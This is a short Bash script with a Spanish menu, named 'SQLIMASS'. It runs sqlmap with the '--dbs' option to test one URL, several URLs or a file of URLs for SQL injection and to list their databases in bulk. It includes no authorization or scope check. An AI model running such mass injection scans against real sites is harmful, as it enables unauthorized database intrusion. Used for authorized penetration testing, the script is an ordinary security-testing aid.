#!/bin/bash


figlet "SQLIMASS"
echo "By:FrankoSav"

show_menu() {
    echo "1. Realizar prueba de inyección SQL en una URL"
    echo "2. Realizar prueba de inyección SQL en varias URLs"
    echo "3. Realizar prueba de inyección SQL en un archivo de URLs"
    echo "4. Salir"
}


while true; do
    show_menu
    read -p "Seleccionar una opcion: " option
    case $option in
        1)
            read -p "Introducir la URL: " url
            sqlmap -u "$url" --dbs
        ;;
        2)
            read -p "Introduce una lista de URLs separadas por espacios: " urls
            # archivo temporal para almacenar las URL
            temp_file=$(mktemp)
            
            # agregando cada URL a una línea del archivo
            for url in $urls; do
                echo "$url" >> "$temp_file"
            done
            
            # Ejecutando SQLMap con la opción -m para proporcionar el archivo de URLs
            sqlmap -m "$temp_file" --dbs
            
            # Eliminando el archivo temporal
            rm "$temp_file"
        ;;
        3)
            read -p "Introduce la ruta al archivo de URLs: " file
            # Viendo si el archivo sirve
            if [ ! -f "$file" ]; then
                echo "El archivo de URLs no existe"
            else
                # Ejecutando SQLMAP con el parametro m para proporcionar el archivo de URLs
                sqlmap -m "$file" --dbs
            fi
        ;;
        4)
            exit 0
        ;;
        *)
            echo "Opcion invalida"
        ;;
    esac
done
